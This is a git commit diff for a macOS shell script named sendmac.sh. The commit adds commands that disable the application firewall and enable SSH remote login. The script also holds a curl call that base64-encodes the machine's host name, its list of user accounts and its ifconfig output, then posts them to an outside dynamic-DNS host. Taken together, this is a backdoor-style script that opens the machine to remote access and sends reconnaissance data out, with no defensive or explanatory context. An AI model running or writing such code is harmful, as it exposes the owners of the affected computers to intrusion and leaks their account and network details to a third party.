ac2197a26a07de9b0e5694869af37add8ec56d91
matthewpipie <matthewpipie@gmail.com>
2017-04-01 16:41:41 -0500

    Update sendmac.sh

--- sendmac.sh
+++ sendmac.sh
@@ -1,1 +1,6 @@
+#disable firewall
+sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0
+#enable ssh
+sudo systemsetup -f -setremotelogin on
+#send info
 curl "pipie.ddns.net:23232" -d "localhostname=$(/usr/sbin/scutil --get LocalHostName | base64 | tr -- '+=/' '-_~')\&users=$(dscl . list /Users | grep -v '^_' | base64 | tr -- '+=/' '-_~')\&ifconfig=$(/sbin/ifconfig | base64 | tr -- '+=/' '-_~')"
